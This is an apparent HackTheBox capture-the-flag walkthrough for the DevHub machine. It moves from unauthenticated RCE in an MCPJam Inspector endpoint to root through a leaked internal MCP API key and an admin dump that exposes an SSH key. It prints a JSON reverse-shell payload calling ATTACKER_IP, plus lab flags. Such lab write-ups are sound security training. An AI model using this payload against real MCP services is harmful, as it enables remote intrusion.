# HackTheBox - DevHub Walkthrough

## Enumeration

Open ports:

    22
    80
    6274

Port 6274 was running MCPJam Inspector.

------------------------------------------------------------------------

# Initial Access

MCPJam Inspector was vulnerable to unauthenticated RCE.

Endpoint:

    /api/mcp/connect

Payload:

``` json
{
 "serverConfig":{
  "command":"/bin/bash",
  "args":["-c","sh -i >& /dev/tcp/ATTACKER_IP/1234 0>&1"]
 }
}
```

Obtained shell:

    mcp-dev

------------------------------------------------------------------------

# User Access

Internal Jupyter service was running on:

    127.0.0.1:8888

The process revealed:

    analyst

User flag:

    d0396be098d8f202c689545694837709

------------------------------------------------------------------------

# Root Escalation

An internal MCP service was running as root.

API key was discovered:

    opsmcp_secret_key_4f5a6b7c8d9e0f1a

The API exposed administrative functionality.

Using:

    ops._admin_dump

The root SSH private key was leaked.

Login:

``` bash
ssh root@devhub.htb -i id_rsa
```

------------------------------------------------------------------------

# Root Flag

    4f0de2a5cdfa060283af86f26671d387

------------------------------------------------------------------------

# Lessons Learned

-   Do not expose MCP services without authentication.
-   Protect internal APIs.
-   Never expose private keys through debug endpoints.
